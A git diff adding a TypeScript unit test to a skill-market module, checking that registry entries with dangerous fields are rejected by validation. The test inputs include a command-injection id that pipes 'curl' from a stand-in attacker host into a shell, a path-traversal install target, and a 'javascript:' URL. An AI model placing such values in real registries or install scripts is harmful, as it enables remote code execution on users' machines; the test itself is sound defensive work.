@@ -102,6 +102,21 @@ describe('skillMarket', () => {
       .toThrow('no TeleAgent-compatible import package')
   })
 
+  it('rejects registry entries whose fields could break or inject into install scripts', () => {
+    const base = registry.skills[0]
+    const select = (patch: Partial<typeof base>) =>
+      () => toSkillInstallSelection({ ...base, ...patch }, '/skill-market/index.json')
+
+    expect(select({ id: 'x$(curl -s http://attacker/i|sh)' })).toThrow('技能条目校验失败')
+    expect(select({ archive: { path: 'dist/skills/markitdown.zip', sha256: 'not-a-sha' } }))
+      .toThrow('技能条目校验失败')
+    expect(select({ installTargets: { claude: '~/Documents/../../etc' } }))
+      .toThrow('技能条目校验失败')
+    expect(select({ archive: { path: 'javascript:alert(1)', sha256: base.archive.sha256 } }))
+      .toThrow('技能条目校验失败')
+    expect(select({})).not.toThrow()
+  })
+
   it('loads detail markdown relative to the active registry source', async () => {
     const fetchMock = vi.fn().mockResolvedValue({ ok: true, text: async () => '# MarkItDown' })
     vi.stubGlobal('fetch', fetchMock)
